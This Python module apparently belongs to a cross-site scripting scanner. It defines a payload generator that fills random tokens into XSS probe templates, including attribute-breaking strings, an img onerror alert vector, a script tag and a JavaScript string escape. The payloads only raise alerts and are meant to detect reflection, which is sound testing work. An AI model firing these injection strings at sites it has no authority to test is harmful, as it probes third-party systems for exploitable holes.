from typing import List, Optional
import random
import string
from utils import make_token


class PayloadGenerator:

    # Generate payloads for different injection contexts.

    def __init__(self, randomize: bool = True, seed: Optional[int] = None):
        self.randomize = randomize
        if seed is not None:
            random.seed(seed)

        self.templates = {
            "attribute-value": [
                # closes attribute then injects token in HTML
                '">{token}<',
                # classic image onerror vector
                '"><img src=x onerror=alert("{token}")>',
                # token only (useful when server reflects raw values)
                '{token}'
            ],
            "text-node": [
                '<script>/*{token}*/</script>',
                '{token}'
            ],
            "script": [
                # closes JS string then triggers alert (may break JS)
                '";alert("{token}");//',
                # directly insert token as comment inside script
                '/*{token}*/'
            ],
            # attribute-name handled specially (no templates that break HTML needed)
            "attribute-name": [
                # For attribute-name we simply return token (to be used as param name)
                '{token}'
            ]
        }

    def generate(self, context: str, param: str, limit: int = 3) -> List[str]:
        ctx = (context or "").lower()
        token = make_token()

        if ctx not in self.templates:
            # return raw token only
            return [token]

        # pick templates (shuffle if randomize True)
        pool = list(self.templates[ctx])
        if self.randomize:
            random.shuffle(pool)

        # Render up to `limit` payloads, substituting {token} and {param} if present
        out = []
        for t in pool[:limit]:
            p = t.format(token=token, param=param)
            out.append(p)

        return out


# quick manual demo when running this module directly
if __name__ == "__main__":
    pg = PayloadGenerator(randomize=True, seed=123)
    for c in ["attribute-name", "attribute-value", "text-node", "script", "unknown"]:
        print(f"\nContext: {c}")
        for pl in pg.generate(c, "q", limit=3):
            print("  ", pl)
